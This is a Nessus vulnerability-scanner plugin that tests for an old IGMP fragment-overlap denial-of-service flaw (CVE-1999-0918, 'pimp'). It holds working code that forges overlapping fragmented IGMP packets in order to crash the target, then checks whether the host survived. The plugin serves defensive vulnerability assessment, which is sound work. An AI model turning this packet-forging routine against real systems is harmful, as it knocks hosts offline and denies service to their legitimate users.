#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#

include("compat.inc");

if (description)
{
 script_id(10179);
 script_version("$Revision: 1.34 $");
 script_cvs_date("$Date: 2016/11/02 14:37:08 $");

 script_cve_id("CVE-1999-0918");
 script_bugtraq_id(514);
 script_osvdb_id(1022);

 script_name(english:"TCP/IP IGMP Overlap Remote DoS (pimp)");
 script_summary(english:"Crashes the remote host via IGMP overlap");

 script_set_attribute(attribute:"synopsis", value:"The remote host is vulnerable to a denial of service attack.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the remote host using the 'pimp' attack. This
flaw allows an attacker to make this host crash at will, thus
preventing the legitimate users from using it.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Jul/22");
 script_set_attribute(attribute:"solution", value:"Filter incoming IGMP traffic.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20);

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/07/04");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/07/28");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"Denial of Service");

 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if ( TARGET_IS_IPV6 ) exit(0);
ip = forge_ip_packet(ip_v  : 4, ip_id  : 69,   ip_p : IPPROTO_IGMP,
		     ip_hl : 5, ip_ttl : 255,  ip_src : this_host(),
		     ip_tos: 0, ip_sum : 0, ip_len : 1500, ip_off:0);


start_denial();
for(i=0;i<15;i=i+1)
{
 igmp = forge_igmp_packet(ip:ip, type:2, code:31, group:128.1.1.1,
			 data:crap(1500));
 igmp = set_ip_elements(ip:igmp, ip_len:1500, ip_off:IP_MF);
 send_packet(igmp, pcap_active:FALSE);

 a = 1480/8;

 igmp = set_ip_elements(ip:igmp,ip_off:a|IP_MF);
 send_packet(igmp, pcap_active:FALSE);

 a = 5920/8;
 igmp = set_ip_elements(ip:igmp, ip_off:a|IP_MF);
 send_packet(igmp, pcap_active:FALSE);

 igmp = set_ip_elements(ip:igmp, ip_len:831, ip_off:7400/8);
 send_packet(igmp, pcap_active:FALSE);
 usleep(500000);
}

alive = end_denial();
if(!alive){
	security_hole(port:0, protocol:"igmp");
	set_kb_item(name:"Host/dead", value:TRUE);
	}
